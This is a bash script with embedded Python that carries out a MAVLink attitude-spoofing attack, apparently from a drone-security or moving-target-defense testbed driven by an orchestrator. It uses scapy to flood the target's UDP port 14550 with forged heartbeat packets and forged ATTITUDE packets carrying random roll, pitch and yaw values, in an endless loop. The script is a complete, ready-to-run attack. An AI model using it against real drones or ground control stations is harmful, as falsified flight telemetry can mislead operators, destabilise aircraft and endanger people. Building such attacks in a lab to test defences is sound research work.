#!/usr/bin/env bash
set -euo pipefail

# Attitude spoofing attack (MAVLink, MTD-aware)

# MTD_INTERFACE_START
# TARGET_IP / TARGET_PORT / TARGET_SERVICE 는 attack_orchestrator.py 가 세팅
if [[ -z "${TARGET_IP:-}" ]]; then
    echo "ERROR: TARGET_IP is not set." >&2
    echo "Run via attack_orchestrator.py so MTD state can resolve the target." >&2
    exit 1
fi

case "${TARGET_SERVICE:-DRONE_MAVLINK}" in
  DRONE_MAVLINK)
    TARGET_PORT="${TARGET_PORT:-14550}"
    ;;
  *)
    if [[ -z "${TARGET_PORT:-}" ]]; then
      echo "ERROR: TARGET_PORT is not set for service ${TARGET_SERVICE:-UNKNOWN}." >&2
      exit 1
    fi
    ;;
esac

echo "[INFO] Target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-DRONE_MAVLINK})"
# MTD_INTERFACE_END

export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then
    . "$BASE/00_env.sh"
else
    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"
    mkdir -p "$(dirname "$DVD_LOG")"
    log(){ echo "[$(date +%F_%T)] $*"; }
    export -f log
fi

log "[ATTACK] id=attitude-spoofing src=Attitude-Spoofing.md"
log "[BLOCK 1] type=python (Inline Spoofing Script)"

python3 - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
import os
import sys
import time
import random

from pymavlink import mavutil
from scapy.all import IP, UDP, Raw, send

# argv 로 IP:PORT 가 안 왔으면 환경변수 사용
if len(sys.argv) <= 1:
    target_ip = os.environ.get("TARGET_IP", "127.0.0.1")
    target_port = os.environ.get("TARGET_PORT", "14550")
    sys.argv = [sys.argv[0], f"{target_ip}:{target_port}"]

target_ip, target_port_str = sys.argv[1].split(":", 1)
try:
    target_port = int(target_port_str)
except ValueError:
    print(f"[ERROR] Invalid port: {target_port_str}")
    sys.exit(1)

print(f"[INFO] Starting MAVLink ATTITUDE spoofing to {target_ip}:{target_port}")

def create_heartbeat():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.heartbeat_encode(
        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        custom_mode=3,
        system_status=mavutil.mavlink.MAV_STATE_ACTIVE,
    ).pack(mav)

def create_attitude():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.attitude_encode(
        time_boot_ms=int(time.time() * 1e3) % 4294967295,
        roll=random.uniform(-1.0, 1.0),
        pitch=random.uniform(-1.0, 1.0),
        yaw=random.uniform(-3.14, 3.14),
        rollspeed=random.uniform(-0.1, 0.1),
        pitchspeed=random.uniform(-0.1, 0.1),
        yawspeed=random.uniform(-0.1, 0.1),
    ).pack(mav)

def send_mavlink_packet(payload: bytes) -> None:
    pkt = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=payload)
    send(pkt, verbose=False)

try:
    while True:
        send_mavlink_packet(create_heartbeat())
        send_mavlink_packet(create_attitude())
        time.sleep(0.05)
except KeyboardInterrupt:
    print("[INFO] Stopping ATTITUDE spoofing.")
PY
